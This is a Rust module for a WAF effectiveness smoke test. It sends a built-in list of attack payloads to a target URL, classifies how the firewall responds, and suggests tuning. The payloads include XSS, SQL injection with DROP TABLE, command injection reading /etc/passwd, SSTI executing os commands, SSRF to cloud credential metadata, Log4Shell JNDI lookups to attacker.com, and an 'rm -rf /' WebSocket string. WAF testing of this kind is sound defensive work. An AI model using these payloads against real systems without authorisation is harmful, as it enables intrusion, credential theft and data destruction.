//! WAF Smoke Test - Advanced WAF Effectiveness Testing
//!
//! This module provides comprehensive WAF effectiveness testing using sophisticated
//! payloads and analysis techniques. It replaces the bash script with better detection,
//! colorful output, and structured results for both CLI and UI consumption.

use crate::effectiveness::static_detection::calculate_similarity;
use crate::engine::waf_mode_detector::{PayloadType, WafMode};
use crate::http::HttpClient;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::{Duration, Instant};
use tokio::time::sleep;

/// WAF Smoke Test Configuration
#[derive(Debug, Clone)]
pub struct SmokeTestConfig {
    pub timeout_seconds: u64,
    pub delay_between_requests_ms: u64,
    pub max_concurrent_requests: usize,
    pub include_advanced_payloads: bool,
    pub custom_headers: HashMap<String, String>,
}

impl Default for SmokeTestConfig {
    fn default() -> Self {
        Self {
            timeout_seconds: 10,
            delay_between_requests_ms: 100,
            max_concurrent_requests: 3,
            include_advanced_payloads: true,
            custom_headers: HashMap::new(),
        }
    }
}

/// Test result for a single payload
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadTestResult {
    pub category: String,
    pub payload: String,
    pub payload_type: PayloadType,
    pub response_status: u16,
    pub response_time_ms: u64,
    pub classification: PayloadClassification,
    pub evidence: Vec<String>,
    pub waf_indicators: Vec<String>,
}

/// Classification of how the WAF handled the payload
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum PayloadClassification {
    /// Request was blocked by WAF (403, 406, 429, 503, etc.)
    Blocked,
    /// Request was allowed through (200, 301, 302, etc.)
    Allowed,
    /// Request resulted in an error (timeout, network error, etc.)
    Error,
    /// Request was rate limited
    RateLimited,
    /// Request triggered a challenge (CloudFlare challenge, etc.)
    Challenge,
}

impl PayloadClassification {
    /// Get the color code for terminal output
    pub fn color_code(&self) -> &'static str {
        match self {
            PayloadClassification::Blocked => "\x1b[32m", // Green
            PayloadClassification::Allowed => "\x1b[31m", // Red
            PayloadClassification::Error => "\x1b[33m",   // Yellow
            PayloadClassification::RateLimited => "\x1b[35m", // Magenta
            PayloadClassification::Challenge => "\x1b[36m", // Cyan
        }
    }

    /// Get the display text for this classification
    pub fn display_text(&self) -> &'static str {
        match self {
            PayloadClassification::Blocked => "BLOCKED",
            PayloadClassification::Allowed => "ALLOWED",
            PayloadClassification::Error => "ERROR",
            PayloadClassification::RateLimited => "RATE LIMITED",
            PayloadClassification::Challenge => "CHALLENGE",
        }
    }

    /// Get the emoji for this classification
    pub fn emoji(&self) -> &'static str {
        match self {
            PayloadClassification::Blocked => "🛡️",
            PayloadClassification::Allowed => "⚠️",
            PayloadClassification::Error => "❌",
            PayloadClassification::RateLimited => "⏰",
            PayloadClassification::Challenge => "🔒",
        }
    }
}

/// Complete smoke test results
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SmokeTestResult {
    pub url: String,
    pub test_results: Vec<PayloadTestResult>,
    pub summary: TestSummary,
    pub waf_mode: Option<WafMode>,
    pub detected_waf: Option<String>,
    pub detected_cdn: Option<String>,
    pub recommendations: Vec<String>,
    pub endpoint_context: Option<EndpointContext>,
    pub total_time_ms: u64,
    pub timestamp: chrono::DateTime<chrono::Utc>,
    pub is_smoke_test: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EndpointContext {
    pub similarity: f64,
    pub status_match: bool,
    pub content_type: Option<String>,
    pub likely_noninteractive: bool,
}

/// Summary statistics for the smoke test
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TestSummary {
    pub total_tests: usize,
    pub blocked_count: usize,
    pub allowed_count: usize,
    pub error_count: usize,
    pub rate_limited_count: usize,
    pub challenge_count: usize,
    pub effectiveness_percentage: f64,
    pub average_response_time_ms: f64,
}

/// WAF Smoke Test Engine
pub struct WafSmokeTest {
    http_client: HttpClient,
    config: SmokeTestConfig,
    payloads: HashMap<PayloadType, Vec<String>>,
}

impl WafSmokeTest {
    pub fn new(config: SmokeTestConfig) -> Result<Self, anyhow::Error> {
        let http_client = HttpClient::new()?;
        let payloads = Self::initialize_advanced_payloads();

        Ok(Self {
            http_client,
            config,
            payloads,
        })
    }

    /// Initialize comprehensive attack payloads for testing
    fn initialize_advanced_payloads() -> HashMap<PayloadType, Vec<String>> {
        let mut payloads = HashMap::new();

        // XSS Payloads - Basic and Advanced
        payloads.insert(
            PayloadType::XssBasic,
            vec![
                "<script>alert('XSS')</script>".to_string(),
                "<img src=x onerror=alert('XSS')>".to_string(),
                "javascript:alert('XSS')".to_string(),
                "<svg onload=alert('XSS')>".to_string(),
            ],
        );

        payloads.insert(
            PayloadType::XssAdvanced,
            vec![
                "\"><script>alert('XSS')</script>".to_string(),
                "';alert('XSS');//".to_string(),
                "<iframe src=javascript:alert('XSS')>".to_string(),
                "<body onload=alert('XSS')>".to_string(),
                "<<SCRIPT>alert('XSS')//<</SCRIPT>".to_string(),
            ],
        );

        // SQL Injection Payloads
        payloads.insert(
            PayloadType::SqlInjectionBasic,
            vec![
                "' OR '1'='1".to_string(),
                "'; DROP TABLE users; --".to_string(),
                "1' UNION SELECT NULL,NULL,NULL--".to_string(),
                "admin'--".to_string(),
            ],
        );

        payloads.insert(
            PayloadType::SqlInjectionAdvanced,
            vec![
                "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--".to_string(),
                "'; WAITFOR DELAY '00:00:05'--".to_string(),
                "' OR 1=1 LIMIT 1 OFFSET 0--".to_string(),
                "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--".to_string(),
                "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--".to_string(),
            ],
        );

        // Path Traversal
        payloads.insert(
            PayloadType::PathTraversal,
            vec![
                "../../../etc/passwd".to_string(),
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts".to_string(),
                "....//....//....//etc/passwd".to_string(),
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd".to_string(),
                "..%252f..%252f..%252fetc%252fpasswd".to_string(),
            ],
        );

        // Command Injection
        payloads.insert(
            PayloadType::CommandInjection,
            vec![
                "; cat /etc/passwd".to_string(),
                "| whoami".to_string(),
                "`id`".to_string(),
                "$(whoami)".to_string(),
                "&& dir".to_string(),
                "; ls -la".to_string(),
            ],
        );

        // File Upload Attacks
        payloads.insert(
            PayloadType::FileUpload,
            vec![
                "shell.php".to_string(),
                "test.php%00.jpg".to_string(),
                "../../../shell.php".to_string(),
                "shell.php.jpg".to_string(),
                "shell.pHp".to_string(),
            ],
        );

        // Scanner Detection - Using tool names that will be converted to proper User-Agents
        payloads.insert(
            PayloadType::ScannerDetection,
            vec![
                "sqlmap".to_string(),
                "nikto".to_string(),
                "nessus".to_string(),
                "burpsuite".to_string(),
                "acunetix".to_string(),
            ],
        );

        // Enumeration
        payloads.insert(
            PayloadType::Enumeration,
            vec![
                "admin".to_string(),
                "administrator".to_string(),
                "config.php".to_string(),
                ".env".to_string(),
                "wp-config.php".to_string(),
            ],
        );

        // HTTP Request Smuggling
        payloads.insert(
            PayloadType::HttpRequestSmuggling,
            vec![
                "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n".to_string(),
                "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG".to_string(),
                "GET / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n".to_string(),
                "GET / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: ch\x00unked\r\n\r\n".to_string(),
            ],
        );

        // GraphQL Injection
        payloads.insert(
            PayloadType::GraphQLInjection,
            vec![
                r#"{"query": "{ __schema { types { name } } }"}"#.to_string(),
                r#"{"query": "{ __type(name: \"User\") { fields { name type { name } } } }"}"#
                    .to_string(),
                r#"query { user(id: "1") { name } user(id: "2") { name } }"#.to_string(),
                r#"query { alias1: user(id: 1) { password } alias2: user(id: 2) { password } }"#
                    .to_string(),
                r#"mutation { updateUser(id: 1, role: "admin") { id role } }"#.to_string(),
            ],
        );

        // Server-Side Template Injection (SSTI)
        payloads.insert(
            PayloadType::SSTI,
            vec![
                "{{7*7}}".to_string(),
                "${7*7}".to_string(),
                "#{7*7}".to_string(),
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}".to_string(),
                "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}".to_string(),
                "${{7*7}}".to_string(),
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}".to_string(),
            ],
        );

        // Prototype Pollution
        payloads.insert(
            PayloadType::PrototypePollution,
            vec![
                r#"{"__proto__": {"admin": true}}"#.to_string(),
                r#"{"constructor": {"prototype": {"admin": true}}}"#.to_string(),
                r#"{"__proto__": {"isAdmin": true, "role": "admin"}}"#.to_string(),
                "?__proto__[admin]=true".to_string(),
                "?constructor[prototype][admin]=true".to_string(),
            ],
        );

        // Server-Side Request Forgery (SSRF)
        payloads.insert(
            PayloadType::SSRF,
            vec![
                "http://169.254.169.254/latest/meta-data/".to_string(),
                "http://metadata.google.internal/computeMetadata/v1/".to_string(),
                "http://169.254.169.254/metadata/instance".to_string(),
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/".to_string(),
                "http://localhost:8080/admin".to_string(),
                "http://127.0.0.1:6379/".to_string(),
                "file:///etc/passwd".to_string(),
            ],
        );

        // Log4Shell (Log4j RCE)
        payloads.insert(
            PayloadType::Log4Shell,
            vec![
                "${jndi:ldap://attacker.com/a}".to_string(),
                "${jndi:rmi://attacker.com/a}".to_string(),
                "${${lower:j}ndi:${lower:l}dap://attacker.com/a}".to_string(),
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}"
                    .to_string(),
                "${jndi:dns://attacker.com}".to_string(),
                "${${env:ENV_VAR:-j}ndi:ldap://attacker.com/a}".to_string(),
            ],
        );

        // WebSocket Injection
        payloads.insert(
            PayloadType::WebSocketInjection,
            vec![
                r#"{"type":"message","data":"<script>alert('XSS')</script>"}"#.to_string(),
                r#"{"cmd":"exec","args":"rm -rf /"}"#.to_string(),
                "Upgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\r\nSec-WebSocket-Protocol: <script>alert(1)</script>".to_string(),
                r#"{"event":"subscribe","channel":"'; DROP TABLE users; --"}"#.to_string(),
            ],
        );

        payloads
    }

    pub fn payload_strings() -> Vec<String> {
        Self::initialize_advanced_payloads()
            .into_values()
            .flatten()
            .collect()
    }

    /// Run comprehensive WAF smoke test
    pub async fn run_test(&self, url: &str) -> Result<SmokeTestResult, anyhow::Error> {
        let start_time = Instant::now();
        let mut test_results = Vec::new();

        println!("🔍 Starting Advanced WAF Effectiveness Test");
        println!("🎯 Target: {url}");
        println!("═══════════════════════════════════════════════════════════════");

        let endpoint_context = self.analyze_endpoint_context(url).await.ok();

        // Test each payload type
        for (payload_type, payloads) in &self.payloads {
            for payload in payloads {
                let result = self
                    .test_single_payload(url, payload_type.clone(), payload)
                    .await?;
                test_results.push(result);

                // Delay between requests to avoid overwhelming the target
                sleep(Duration::from_millis(self.config.delay_between_requests_ms)).await;
            }
        }

        let total_time = start_time.elapsed();

        // Analyze results
        let summary = self.calculate_summary(&test_results);
        let waf_mode = self.determine_waf_mode(&test_results);
        let detected_waf = self.identify_waf_from_results(&test_results);
        let recommendations = self.generate_recommendations(
            &summary,
            &waf_mode,
            &detected_waf,
            endpoint_context.as_ref(),
        );

        let result = SmokeTestResult {
            url: url.to_string(),
            test_results,
            summary,
            waf_mode,
            detected_waf,
            detected_cdn: None,
            recommendations,
            endpoint_context,
            total_time_ms: total_time.as_millis() as u64,
            timestamp: chrono::Utc::now(),
            is_smoke_test: true,
        };

        Ok(result)
    }

    /// Test a single payload against the target
    async fn test_single_payload(
        &self,
        url: &str,
        payload_type: PayloadType,
        payload: &str,
    ) -> Result<PayloadTestResult, anyhow::Error> {
        let test_url = self.build_test_url(url, payload)?;
        let start_time = Instant::now();

        // For scanner detection, use realistic User-Agent headers instead of query params
        let response = if payload_type == PayloadType::ScannerDetection {
            // Use scanner name as User-Agent instead of query parameter
            let scanner_user_agent = match payload {
                "sqlmap" => "sqlmap/1.6.12 (https://sqlmap.org)",
                "nikto" => "Mozilla/5.0 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)",
                "nessus" => "Mozilla/5.0 (compatible; Nessus; https://www.tenable.com/)",
                "burpsuite" => {
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 BurpSuite"
                }
                "acunetix" => {
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Acunetix/1.0"
                }
                _ => "WAF-Detector/1.0 Scanner Test",
            };

            match self
                .http_client
                .get_with_headers(url, &[("User-Agent", scanner_user_agent)])
                .await
            {
                Ok(resp) => resp,
                Err(e) => {
                    return Ok(PayloadTestResult {
                        category: format!("{payload_type:?}"),
                        payload: payload.to_string(),
                        payload_type,
                        response_status: 0,
                        response_time_ms: start_time.elapsed().as_millis() as u64,
                        classification: PayloadClassification::Error,
                        evidence: vec![format!("Request failed: {e}")],
                        waf_indicators: vec![],
                    });
                }
            }
        } else {
            // Regular payload testing via query parameters
            match self.http_client.get(&test_url).await {
                Ok(resp) => resp,
                Err(e) => {
                    return Ok(PayloadTestResult {
                        category: format!("{payload_type:?}"),
                        payload: payload.to_string(),
                        payload_type,
                        response_status: 0,
                        response_time_ms: start_time.elapsed().as_millis() as u64,
                        classification: PayloadClassification::Error,
                        evidence: vec![format!("Request failed: {e}")],
                        waf_indicators: vec![],
                    });
                }
            }
        };

        let response_time = start_time.elapsed();

        // Classify the response
        let (classification, evidence, waf_indicators) = self.classify_response(&response, payload);

        // For scanner detection, add a special note about what's being tested
        let mut final_evidence = evidence;
        if payload_type == PayloadType::ScannerDetection {
            final_evidence.push(format!(
                "Testing if WAF blocks '{payload}' scanner signature via User-Agent header"
            ));
        }

        // Print real-time result
        self.print_test_result(
            &payload_type,
            payload,
            &classification,
            response.status,
            response_time.as_millis() as u64,
        );

        Ok(PayloadTestResult {
            category: format!("{payload_type:?}"),
            payload: payload.to_string(),
            payload_type,
            response_status: response.status,
            response_time_ms: response_time.as_millis() as u64,
            classification,
            evidence: final_evidence,
            waf_indicators,
        })
    }

    /// Build test URL with payload
    fn build_test_url(&self, base_url: &str, payload: &str) -> Result<String, anyhow::Error> {
        let url = if base_url.contains("FUZZ") {
            base_url.replace("FUZZ", payload)
        } else if base_url.contains('?') {
            format!("{base_url}&test={}", urlencoding::encode(payload))
        } else {
            format!("{base_url}?test={}", urlencoding::encode(payload))
        };
        Ok(url)
    }

    /// Classify the response based on status code, headers, and body
    fn classify_response(
        &self,
        response: &crate::http::HttpResponse,
        payload: &str,
    ) -> (PayloadClassification, Vec<String>, Vec<String>) {
        let mut evidence = Vec::new();
        let mut waf_indicators = Vec::new();

        // Check status codes
        let classification = match response.status {
            403 => {
                evidence.push("HTTP 403 Forbidden - Request blocked".to_string());
                PayloadClassification::Blocked
            }
            406 => {
                evidence.push("HTTP 406 Not Acceptable - Request rejected".to_string());
                PayloadClassification::Blocked
            }
            429 => {
                evidence.push("HTTP 429 Too Many Requests - Rate limited".to_string());
                PayloadClassification::RateLimited
            }
            503 => {
                evidence.push("HTTP 503 Service Unavailable - Potentially blocked".to_string());
                PayloadClassification::Blocked
            }
            200 | 301 | 302 => {
                evidence.push(format!(
                    "HTTP {} - Request allowed through",
                    response.status
                ));
                PayloadClassification::Allowed
            }
            _ => {
                evidence.push(format!("HTTP {} - Unexpected response", response.status));
                PayloadClassification::Error
            }
        };

        // Check for WAF-specific headers
        for (name, value) in &response.headers {
            let name_lower = name.to_lowercase();
            let value_lower = value.to_lowercase();

            // CloudFlare indicators
            if name_lower.contains("cf-") || value_lower.contains("cloudflare") {
                waf_indicators.push("CloudFlare".to_string());
                evidence.push(format!("CloudFlare header detected: {name}: {value}"));
            }

            // AWS WAF indicators
            if name_lower.contains("x-amz") || value_lower.contains("aws") {
                waf_indicators.push("AWS WAF".to_string());
                evidence.push(format!("AWS WAF header detected: {name}: {value}"));
            }

            // Akamai indicators
            if name_lower.contains("akamai") || value_lower.contains("akamai") {
                waf_indicators.push("Akamai".to_string());
                evidence.push(format!("Akamai header detected: {name}: {value}"));
            }

            // Generic blocking indicators
            if name_lower.contains("blocked")
                || name_lower.contains("security")
                || value_lower.contains("blocked")
                || value_lower.contains("denied")
            {
                evidence.push(format!("Blocking header detected: {name}: {value}"));
            }
        }

        // Check response body for indicators
        let body_lower = response.body.to_lowercase();

        if let Some(vendor) = Self::match_block_template(&body_lower) {
            evidence.push(format!("Block page template match: {vendor}"));
            waf_indicators.push(vendor.to_string());
            return (PayloadClassification::Blocked, evidence, waf_indicators);
        }

        // Challenge page indicators
        if body_lower.contains("checking your browser")
            || body_lower.contains("challenge")
            || body_lower.contains("captcha")
        {
            evidence.push("Challenge page detected".to_string());
            return (PayloadClassification::Challenge, evidence, waf_indicators);
        }

        // Blocking page indicators
        let blocking_keywords = [
            "access denied",
            "blocked",
            "forbidden",
            "not allowed",
            "security violation",
            "malicious request",
            "attack detected",
            "waf",
            "firewall",
            "protection",
            "security policy",
            "threat detected",
        ];

        for keyword in &blocking_keywords {
            if body_lower.contains(keyword) {
                evidence.push(format!("Blocking keyword detected: {keyword}"));
                break;
            }
        }

        // Check if payload is reflected (monitoring mode indicator)
        if classification == PayloadClassification::Allowed && response.body.contains(payload) {
            evidence.push("Payload reflected in response (possible monitoring mode)".to_string());
        }

        (classification, evidence, waf_indicators)
    }

    fn match_block_template(body_lower: &str) -> Option<&'static str> {
        let templates = [
            (
                "CloudFlare",
                ["cloudflare", "attention required", "ray id"].as_slice(),
            ),
            ("Akamai", ["akamai", "reference", "incident id"].as_slice()),
            ("AWS WAF", ["request blocked", "aws waf"].as_slice()),
            (
                "F5 BIG-IP",
                ["the requested url was rejected", "support id"].as_slice(),
            ),
            ("Sucuri", ["access denied", "sucuri"].as_slice()),
            ("Imperva", ["incapsula", "incident id"].as_slice()),
        ];

        templates
            .iter()
            .find(|(_, markers)| markers.iter().all(|m| body_lower.contains(*m)))
            .map(|(vendor, _)| *vendor)
    }

    async fn analyze_endpoint_context(&self, url: &str) -> Result<EndpointContext, anyhow::Error> {
        let baseline = self.http_client.get(url).await?;
        let probe_url = if url.contains('?') {
            format!("{url}&waf_probe=1")
        } else {
            format!("{url}?waf_probe=1")
        };
        let probe = self.http_client.get(&probe_url).await?;

        let similarity = calculate_similarity(&baseline.body, &probe.body);
        let status_match = baseline.status == probe.status;
        let base_len = baseline.body.len() as f64;
        let probe_len = probe.body.len() as f64;
        let len_diff_ratio = if base_len > 0.0 {
            ((base_len - probe_len).abs() / base_len).min(1.0)
        } else {
            0.0
        };

        let content_type = baseline.headers.get("content-type").cloned();
        let likely_noninteractive = status_match && similarity > 0.95 && len_diff_ratio < 0.05;

        Ok(EndpointContext {
            similarity,
            status_match,
            content_type,
            likely_noninteractive,
        })
    }

    /// Print colored test result in real-time
    fn print_test_result(
        &self,
        payload_type: &PayloadType,
        payload: &str,
        classification: &PayloadClassification,
        status_code: u16,
        response_time_ms: u64,
    ) {
        let color = classification.color_code();
        let reset = "\x1b[0m";
        let emoji = classification.emoji();

        let payload_display = if payload.len() > 30 {
            format!("{}...", &payload[..27])
        } else {
            payload.to_string()
        };

        println!(
            "{} {:<20} │ {:<30} │ {}{:<12}{} │ {:>3} │ {:>4}ms",
            emoji,
            format!("{:?}", payload_type),
            payload_display,
            color,
            classification.display_text(),
            reset,
            status_code,
            response_time_ms
        );
    }

    /// Calculate summary statistics
    fn calculate_summary(&self, results: &[PayloadTestResult]) -> TestSummary {
        let total_tests = results.len();
        let blocked_count = results
            .iter()
            .filter(|r| r.classification == PayloadClassification::Blocked)
            .count();
        let allowed_count = results
            .iter()
            .filter(|r| r.classification == PayloadClassification::Allowed)
            .count();
        let error_count = results
            .iter()
            .filter(|r| r.classification == PayloadClassification::Error)
            .count();
        let rate_limited_count = results
            .iter()
            .filter(|r| r.classification == PayloadClassification::RateLimited)
            .count();
        let challenge_count = results
            .iter()
            .filter(|r| r.classification == PayloadClassification::Challenge)
            .count();

        let effectiveness_percentage = if total_tests > 0 {
            ((blocked_count + rate_limited_count + challenge_count) as f64 / total_tests as f64)
                * 100.0
        } else {
            0.0
        };

        let average_response_time_ms = if total_tests > 0 {
            results.iter().map(|r| r.response_time_ms).sum::<u64>() as f64 / total_tests as f64
        } else {
            0.0
        };

        TestSummary {
            total_tests,
            blocked_count,
            allowed_count,
            error_count,
            rate_limited_count,
            challenge_count,
            effectiveness_percentage,
            average_response_time_ms,
        }
    }

    /// Determine WAF mode based on test results
    fn determine_waf_mode(&self, results: &[PayloadTestResult]) -> Option<WafMode> {
        let total_tests = results.len();
        if total_tests == 0 {
            return None;
        }

        let blocked_tests = results
            .iter()
            .filter(|r| {
                matches!(
                    r.classification,
                    PayloadClassification::Blocked
                        | PayloadClassification::RateLimited
                        | PayloadClassification::Challenge
                )
            })
            .count();

        let block_rate = blocked_tests as f64 / total_tests as f64;

        match block_rate {
            rate if rate >= 0.8 => Some(WafMode::Blocking),
            rate if rate >= 0.3 => Some(WafMode::Mixed),
            rate if rate > 0.0 => Some(WafMode::Mixed),
            _ => {
                // Check for monitoring indicators
                let has_monitoring = results.iter().any(|r| {
                    r.evidence
                        .iter()
                        .any(|e| e.contains("monitoring") || e.contains("reflected"))
                });

                if has_monitoring {
                    Some(WafMode::Monitoring)
                } else {
                    Some(WafMode::Unknown)
                }
            }
        }
    }

    /// Identify WAF type from test results
    fn identify_waf_from_results(&self, results: &[PayloadTestResult]) -> Option<String> {
        let mut waf_votes: HashMap<String, usize> = HashMap::new();

        for result in results {
            for indicator in &result.waf_indicators {
                *waf_votes.entry(indicator.clone()).or_insert(0) += 1;
            }
        }

        waf_votes
            .into_iter()
            .max_by_key(|(_, count)| *count)
            .map(|(waf, _)| waf)
    }

    /// Generate recommendations based on test results
    fn generate_recommendations(
        &self,
        summary: &TestSummary,
        waf_mode: &Option<WafMode>,
        detected_waf: &Option<String>,
        endpoint_context: Option<&EndpointContext>,
    ) -> Vec<String> {
        let mut recommendations = Vec::new();

        if let Some(context) = endpoint_context {
            if context.likely_noninteractive {
                recommendations.push("⚠️ Target appears unresponsive to parameters (likely static or non-interactive). Consider testing an input-processing endpoint for higher confidence.".to_string());
            }
        }

        // Effectiveness recommendations
        match summary.effectiveness_percentage {
            p if p >= 90.0 => {
                recommendations.push(
                    "🟢 Excellent WAF protection! Very few attacks would succeed.".to_string(),
                );
            }
            p if p >= 70.0 => {
                recommendations.push(
                    "🟡 Good WAF protection, but some attack vectors may still be exploitable."
                        .to_string(),
                );
            }
            p if p >= 50.0 => {
                recommendations.push(
                    "🟠 Moderate WAF protection. Consider tuning rules for better coverage."
                        .to_string(),
                );
            }
            _ => {
                recommendations.push("🔴 Low WAF protection. Many attacks are getting through - review configuration.".to_string());
            }
        }

        // Mode-specific recommendations
        if let Some(mode) = waf_mode {
            match mode {
                WafMode::Blocking => {
                    recommendations
                        .push("WAF is in blocking mode - actively preventing attacks.".to_string());
                }
                WafMode::Monitoring => {
                    recommendations.push("⚠️ WAF appears to be in monitoring mode - attacks are logged but not blocked.".to_string());
                    recommendations
                        .push("Consider enabling blocking mode for better protection.".to_string());
                }
                WafMode::Mixed => {
                    recommendations.push(
                        "WAF is in mixed mode - some attacks blocked, others allowed.".to_string(),
                    );
                    recommendations
                        .push("Review WAF rules to ensure consistent protection.".to_string());
                }
                WafMode::Unknown => {
                    recommendations.push(
                        "Unable to determine WAF mode. May need manual investigation.".to_string(),
                    );
                }
            }
        }

        // WAF-specific recommendations
        if let Some(waf) = detected_waf {
            match waf.as_str() {
                "CloudFlare" => {
                    recommendations.push("🛡️ CloudFlare detected - consider enabling additional security features like Bot Fight Mode.".to_string());
                }
                "AWS WAF" => {
                    recommendations.push("☁️ AWS WAF detected - review CloudWatch metrics and consider AWS Managed Rules.".to_string());
                }
                "Akamai" => {
                    recommendations.push(
                        "🌐 Akamai detected - consider Bot Manager for advanced bot protection."
                            .to_string(),
                    );
                }
                _ => {
                    recommendations.push(format!(
                        "WAF identified as {waf} - consult vendor documentation for optimization."
                    ));
                }
            }
        }

        // Performance recommendations
        if summary.average_response_time_ms > 1000.0 {
            recommendations.push(
                "⏰ High response times detected - WAF may be causing performance impact."
                    .to_string(),
            );
        }

        recommendations
    }

    /// Print comprehensive summary table
    pub fn print_summary(&self, result: &SmokeTestResult) {
        println!(
            "\n╔═══════════════════════════════════════════════════════════════════════════════╗"
        );
        println!(
            "║                           WAF EFFECTIVENESS TEST RESULTS                     ║"
        );
        println!(
            "╠═══════════════════════════════════════════════════════════════════════════════╣"
        );
        println!(
            "║ Target URL: {:<65} ║",
            self.truncate_string(&result.url, 65)
        );

        if let Some(waf) = &result.detected_waf {
            println!("║ Detected WAF: {waf:<61} ║");
        }

        if let Some(mode) = &result.waf_mode {
            println!("║ WAF Mode: {mode:<65} ║");
        }

        println!(
            "╠═══════════════════════════════════════════════════════════════════════════════╣"
        );

        let s = &result.summary;
        println!(
            "║ Total Tests: {:<10} │ Blocked: {:<10} │ Allowed: {:<10} ║",
            s.total_tests, s.blocked_count, s.allowed_count
        );
        println!(
            "║ Errors: {:<13} │ Rate Limited: {:<6} │ Challenges: {:<7} ║",
            s.error_count, s.rate_limited_count, s.challenge_count
        );
        println!(
            "║ Effectiveness: {:<6.1}% │ Avg Response: {:<6.0}ms │ Total Time: {:<6}ms ║",
            s.effectiveness_percentage, s.average_response_time_ms, result.total_time_ms
        );

        println!(
            "╠═══════════════════════════════════════════════════════════════════════════════╣"
        );
        println!(
            "║ RECOMMENDATIONS:                                                             ║"
        );

        for (i, rec) in result.recommendations.iter().enumerate() {
            if i < 5 {
                // Limit to 5 recommendations in summary
                println!("║ • {:<75} ║", self.truncate_string(rec, 75));
            }
        }

        println!(
            "╚═══════════════════════════════════════════════════════════════════════════════╝"
        );
    }

    /// Export results to JSON file
    pub fn export_json(
        &self,
        result: &SmokeTestResult,
        output_file: &str,
    ) -> Result<(), anyhow::Error> {
        let json = serde_json::to_string_pretty(result)?;
        std::fs::write(output_file, json.as_bytes())?;
        println!("📄 Results exported to: {output_file}");
        Ok(())
    }

    fn truncate_string(&self, s: &str, max_len: usize) -> String {
        if s.len() <= max_len {
            s.to_string()
        } else {
            format!("{}...", &s[..max_len - 3])
        }
    }
}

impl Default for WafSmokeTest {
    fn default() -> Self {
        let config = SmokeTestConfig::default();
        match Self::new(config.clone()) {
            Ok(test) => test,
            Err(err) => {
                eprintln!("⚠️  Failed to create WafSmokeTest: {err}. Falling back to defaults.");
                Self {
                    http_client: HttpClient::default(),
                    config,
                    payloads: Self::initialize_advanced_payloads(),
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_payload_classification() {
        let smoke_test = WafSmokeTest::default();

        // Test blocked response
        let response = crate::http::HttpResponse {
            status: 403,
            headers: std::collections::HashMap::new(),
            body: "Access Denied".to_string(),
            url: "test".to_string(),
        };

        let (classification, evidence, _) = smoke_test.classify_response(&response, "test");
        assert_eq!(classification, PayloadClassification::Blocked);
        assert!(!evidence.is_empty());
    }

    #[test]
    fn test_template_match_blocked() {
        let smoke_test = WafSmokeTest::default();
        let response = crate::http::HttpResponse {
            status: 200,
            headers: std::collections::HashMap::new(),
            body: "Attention Required! Cloudflare Ray ID: 12345".to_string(),
            url: "test".to_string(),
        };

        let (classification, evidence, waf_indicators) =
            smoke_test.classify_response(&response, "test");

        assert_eq!(classification, PayloadClassification::Blocked);
        assert!(evidence
            .iter()
            .any(|e| e.contains("Block page template match")));
        assert!(waf_indicators.iter().any(|w| w == "CloudFlare"));
    }

    #[tokio::test]
    async fn test_endpoint_context_noninteractive() {
        let baseline = crate::http::HttpResponse {
            status: 200,
            headers: std::collections::HashMap::new(),
            body: "static page".to_string(),
            url: "test".to_string(),
        };
        let probe = crate::http::HttpResponse {
            status: 200,
            headers: std::collections::HashMap::new(),
            body: "static page".to_string(),
            url: "test".to_string(),
        };

        let similarity = calculate_similarity(&baseline.body, &probe.body);
        assert!(similarity > 0.95);
    }

    #[test]
    fn test_summary_calculation() {
        let results = vec![
            PayloadTestResult {
                category: "XSS".to_string(),
                payload: "test".to_string(),
                payload_type: PayloadType::XssBasic,
                response_status: 403,
                response_time_ms: 100,
                classification: PayloadClassification::Blocked,
                evidence: vec![],
                waf_indicators: vec![],
            },
            PayloadTestResult {
                category: "SQLi".to_string(),
                payload: "test".to_string(),
                payload_type: PayloadType::SqlInjectionBasic,
                response_status: 200,
                response_time_ms: 150,
                classification: PayloadClassification::Allowed,
                evidence: vec![],
                waf_indicators: vec![],
            },
        ];

        let smoke_test = WafSmokeTest::default();
        let summary = smoke_test.calculate_summary(&results);

        assert_eq!(summary.total_tests, 2);
        assert_eq!(summary.blocked_count, 1);
        assert_eq!(summary.allowed_count, 1);
        assert_eq!(summary.effectiveness_percentage, 50.0);
    }
}
